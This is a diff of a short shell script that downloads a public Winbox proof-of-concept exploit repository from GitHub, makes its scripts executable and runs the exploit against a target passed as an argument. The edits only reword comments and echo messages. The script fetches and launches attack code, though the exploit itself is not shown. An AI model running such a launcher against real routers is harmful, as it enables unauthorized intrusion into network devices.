@@ -4,23 +4,23 @@ winboxPoC="https://github.com/BasuCert/winboxPoC"
 
 cd ~/
 
-#Download
-echo downloading...
+# Download the repo
+echo Downloading...
 git clone $winboxPoC
-echo downloaded!
+echo Downloaded!
 
-#Get Permission
+# Get execution permission on repo's files
 
 cd ~/winboxPoC
 
-echo Set File Permission
+echo Setting execution permission... 
 
 sudo chmod +x MACServerDiscover.py
 sudo chmod +x MACServerExploit.py
 
-echo Permission Setted
+echo Permission Setted!
 
-#Execution
+# Execute the exploit
 
 python3 WinboxExploit.py $1
 
